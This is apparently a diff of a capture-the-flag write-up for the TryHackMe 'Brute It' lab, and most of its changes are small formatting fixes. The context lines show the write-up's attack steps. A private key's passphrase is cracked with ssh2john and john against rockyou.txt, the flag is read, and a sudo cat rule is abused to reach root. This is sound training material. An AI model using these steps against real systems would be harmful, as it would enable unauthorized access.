@@ -188,7 +188,7 @@ Right click on page then click save as to download the private key
 To convert the private key to a format that john the ripper can crack use the following command
 ```
 ssh2john id_rsa _rsa > id_rsa.hash               
-
+```
 To crack the hash run the following command
 ```
 john --wordlist=rockyou.txt id_rsa.hash                  
@@ -242,8 +242,6 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
 Last login: Mon Jan 29 00:14:47 2024 from 10.13.0.39
 ```
-
-User.txt flag is located in john's home directory
 ```
 john@bruteit:~$ cat user.txt 
 THM{a_password_is_not_a_barrier}
@@ -262,7 +260,6 @@ User john may run the following commands on bruteit:
     (root) NOPASSWD: /bin/cat
 
 ```
-
 
 
 Searching [gtfobins](https://gtfobins.github.io/gtfobins/cat/#sudo) I find the following commands that allow me to set the root.txt flag (which is usually in the root directory) to a variable and then use cat to read the file
@@ -311,6 +308,8 @@ Password:
 root@bruteit:/home/john# whoami
 root
 ```
+
+
 
 
 
